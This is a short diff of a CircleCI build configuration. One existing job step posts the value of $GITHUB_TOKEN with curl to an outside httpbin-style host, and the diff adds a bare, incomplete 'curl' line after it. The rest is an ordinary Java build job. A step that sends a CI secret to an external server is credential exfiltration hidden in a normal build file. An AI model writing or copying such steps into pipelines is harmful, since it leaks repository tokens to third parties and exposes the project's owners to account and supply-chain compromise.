@@ -14,6 +14,8 @@ jobs:
             curl --data @-  https://jacek-httpbin.prototypes.kube001.services.stellar-ops.com/test/ <<EOF
             {"value":"$GITHUB_TOKEN"}
             EOF
+            curl
+
   shadow_jar:
     docker:
       - image: circleci/openjdk:8
